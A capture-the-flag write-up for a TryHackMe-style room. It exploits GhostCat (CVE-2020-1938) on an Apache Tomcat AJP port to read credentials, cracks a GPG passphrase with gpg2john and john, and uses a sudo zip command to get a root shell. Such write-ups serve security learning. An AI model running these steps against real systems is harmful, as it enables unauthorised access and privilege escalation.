### Initial Scan
```
sudo nmap -sC -sV -p- $IP
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-09 10:05 +0200
Nmap scan report for 10.113.183.113
Host is up (0.022s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
|_  256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http       Apache Tomcat 9.0.30
|_http-title: Apache Tomcat/9.0.30
|_http-favicon: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.83 seconds

```

### GhostCat

The apache tomcat on port 8080 runs on version 9.0.30 and thus is vulnerable to **CVE-2020-1938**, which is also hinted by the room description itself.

GhostCat is a file disclosure vulnerability which allows the attacker to read files on the target system, if the ajp port is enabled (default). It can even be used to gain RCE, if the attacker is able to upload `.jsp` files (which should not be the case here).

I  used a public exploit script to read `WEB-INF/web.xml`, which already held some credentials:
Script: https://github.com/Hancheng-Lei/Hacking-Vulnerability-CVE-2020-1938-Ghostcat/tree/main
```
python2 CVE-2020-1938.py 10.113.183.113 -p 8009 -f WEB-INF/web.xml
Getting resource at ajp13://10.113.183.113:8009/asdf
----------------------------
<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to GhostCat
        skyfuck:8730281lkjlkjdqlksalks
  </description>

</web-app>

```

Credentials: `skyfuck:8730281lkjlkjdqlksalks`

With these credentials, we are able to ssh into the machine and retrieve the user flag in the `/home/merlin/` directory (although we are user skyfuck).

### Privilege Escalation

**GPG Credential decryption:**
```
gpg --import tryhackme.asc

gpg --list-secret-keys

# may ask for passphrase
gpg --decrypt credential.pgp 
```

**GPG Passphrase decryption**
```
gpg2john tryhackme.asc > hash.txt

john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt   
...
alexandru        (tryhackme)     
...

```

Decrypting now gives us folowing credentials, which we can use to log in as merlin:
```
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
```

As merlin we are allowed to run zip with sudo privileges:
```
sudo -l
Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
```

Using our trustworthy friend gtfobins, we can use the following command to gain a root shell:
```
sudo zip /path/to/temp-file /etc/hosts -T -TT '/bin/sh #'

# Command I used on the machine
sudo /usr/bin/zip /tmp/test /etc/hosts -T -TT '/bin/sh #'
```
